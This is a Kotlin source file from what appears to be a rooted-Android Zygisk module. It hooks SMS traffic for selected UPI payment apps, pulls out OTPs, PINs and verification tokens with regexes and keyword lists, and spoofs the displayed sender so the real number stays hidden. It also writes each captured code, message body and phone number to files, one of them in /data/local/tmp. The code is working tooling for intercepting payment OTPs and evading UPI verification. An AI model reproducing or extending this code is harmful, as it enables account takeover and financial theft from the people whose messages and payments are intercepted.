package com.hivirtus.zygiskmode

import android.content.Context
import org.json.JSONObject
import java.util.regex.Pattern

object SmsMatcher {

    private val OTP_PATTERN = Pattern.compile("""\b(\d{4,8})\b""")
    private val PLACEHOLDER_SENDER = "AD-TEST-S"

    fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
        UpiAppRegistry.ALL.filter { config.hookedUpiApps[it.packageName] == true }

    /** Jo user MESSAGE tab me dale — bilkul wahi, bina change kiye */
    fun userSenderId(config: ModuleConfig): String? {
        val id = config.injectSenderId.trim()
        if (id.isBlank()) return null
        if (id.equals(PLACEHOLDER_SENDER, ignoreCase = true)) return null
        return id
    }

    fun shouldCaptureIncoming(config: ModuleConfig, sender: String, body: String): Boolean {
        if (!config.hookIncomingSms && !config.hookUpiVerification) return false
        return shouldCaptureForHookedApps(config, sender, body)
    }

    fun shouldCaptureOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
        if (!config.hookOutgoingSms) return false
        return shouldCaptureForHookedApps(config, recipient, body)
    }

    private fun shouldCaptureForHookedApps(config: ModuleConfig, peer: String, body: String): Boolean {
        if (body.isBlank() || peer.isBlank()) return false
        val hooked = enabledHookedApps(config)
        if (hooked.isEmpty()) return false

        val customId = userSenderId(config)

        // Dusre phone se OTP — intercept (display = tumhara Sender ID, number nahi)
        if (customId != null && isOtpLike(body)) return true

        if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true
        if (isVerificationBody(body) && UpiAppRegistry.matchAmongByBody(hooked, body) != null) return true

        return false
    }

    /** Telegram intercept — kabhi dusre phone / real number mat dikhao */
    fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
        userSenderId(config)?.let { return it }
        if (isCarrierSenderId(actualPeer)) return actualPeer.trim()
        val spoof = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
        return spoof.ifBlank { "INTERCEPT" }
    }

    fun isCarrierSenderId(sender: String): Boolean {
        val s = sender.trim()
        if (s.isBlank()) return false
        if (isNumericSender(s)) return false
        return s.any { it.isLetter() }
    }

    fun isNumericSender(sender: String): Boolean {
        val digits = sender.replace("\\D".toRegex(), "")
        return digits.length >= 8 && !sender.any { it.isLetter() }
    }

    fun extractToken(body: String, autoExtract: Boolean): String {
        val trimmed = body.trim()
        if (trimmed.isEmpty()) return ""
        if (isEncryptedToken(trimmed)) return trimmed
        if (!autoExtract) return trimmed

        val matcher = OTP_PATTERN.matcher(trimmed)
        if (matcher.find()) {
            val digits = matcher.group(1) ?: trimmed
            if (digits.length < 6 && trimmed.length > 20) return trimmed
            return digits
        }
        return trimmed
    }

    fun isEncryptedToken(text: String): Boolean {
        if (text.length < 24) return false
        val compact = text.replace("\\s".toRegex(), "")
        if (compact.length < 20) return false
        val tokenChars = compact.count { it.isLetterOrDigit() || it in "+/=)(?&._-" }
        return tokenChars >= compact.length * 0.85
    }

    private fun isOtpLike(body: String): Boolean {
        if (isVerificationBody(body)) return true
        val trimmed = body.trim()
        if (trimmed.length in 4..8 && trimmed.all { it.isDigit() }) return true
        return OTP_PATTERN.matcher(trimmed).find()
    }

    private fun isVerificationBody(body: String): Boolean {
        if (isEncryptedToken(body)) return true
        val upper = body.uppercase()
        val keywords = listOf(
            "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "CODE", "PIN", "PASSWORD", "BANK"
        )
        return keywords.any { upper.contains(it) }
    }
}

object OtpCaptureWriter {

    fun write(context: Context, otp: LastOtp) {
        val json = JSONObject().apply {
            put("otp", otp.otp)
            put("sender", otp.sender)
            put("body", otp.body)
            put("direction", otp.direction)
            put("phone", otp.phone)
            put("message_label", otp.messageLabel)
            put("captured_at", System.currentTimeMillis())
        }
        val payload = json.toString()
        val appDir = context.getExternalFilesDir(null) ?: context.filesDir

        try {
            appDir.mkdirs()
            java.io.File(appDir, ConfigManager.APP_OTP_NAME).writeText(payload)
        } catch (_: Exception) {}

        try {
            java.io.File("/data/local/tmp/hivirtus_last_otp.json").writeText(payload)
        } catch (_: Exception) {}
    }
}
